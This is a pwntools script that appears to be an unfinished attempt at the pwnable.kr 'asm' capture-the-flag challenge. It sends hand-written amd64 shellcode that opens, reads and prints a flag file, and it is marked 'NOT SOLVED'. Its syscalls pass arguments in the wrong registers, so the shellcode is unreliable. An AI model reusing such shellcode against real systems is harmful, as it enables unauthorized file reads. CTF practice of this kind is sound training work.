from pwn import *

'''



** Warning : NOT SOLVED **



'''


context.arch = "amd64"
context.log_level = "DEBUG"

p = process("./asm")

shellcode_path = "/home/asm/this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

buf = hex(0x41414000)

# shellcode_encode = ""

# for ind in range(len(shellcode_path)):
#     shellcode_encode += ("\n" if ind is not 0 and ind % 8 is 0 else "") + hex(ord(shellcode_path[(ind + 7 - 2 * (ind % 8)) if ind + 8 < len(shellcode_path) else ind]))[2:]

# shellcode_encode = "mov rax, 0x" + "\npush rax\nmov rax, 0x".join(map(lambda x: x.zfill(16), shellcode_encode.split("\n")[::-1])) + "\npush rax"

# # print(shellcode_encode)

shellcode = asm('''
_start:
xor rax, rax
xor rbx, rbx
xor rcx, rcx
xor rdx, rdx

mov rax, 0x0000000000000067
push rax
mov rax, 0x6e306f306f306f6e
push rax
mov rax, 0x306f306f306f3030
push rax
mov rax, 0x3030303030303030
push rax
mov rax, 0x30306f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f30303030303030
push rax
mov rax, 0x3030303030303030
push rax
mov rax, 0x3030303030303030
push rax
mov rax, 0x30306f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6c5f
push rax
mov rax, 0x797265765f73695f
push rax
mov rax, 0x656d616e5f656c69
push rax
mov rax, 0x665f6568745f7972
push rax
mov rax, 0x726f732e656c6966
push rax
mov rax, 0x5f736968745f6461
push rax
mov rax, 0x65725f657361656c
push rax
mov rax, 0x705f656c69665f67
push rax
mov rax, 0x616c665f726b2e65
push rax
mov rax, 0x6c62616e77705f73
push rax
mov rax, 0x695f736968742f6d
push rax
mov rax, 0x73612f656d6f682f
push rax

mov rax, 0x2
mov rbx, [rsp]
mov rcx, 0x0
mov rdx, 0777
syscall

push rax
mov rax, 0x0
mov rbx, [rsp]
mov rcx, ''' + buf + '''
mov rdx, 0x50
syscall

mov rax, 0x1
mov rbx, 0x1
mov rcx, ''' + buf + '''
mov rdx, 0x50
syscall

mov rax, 0x3
mov rbx, [rsp]
syscall
''')

p.sendlineafter("shellcode: ", shellcode)
print(p.recv())
p.interactive()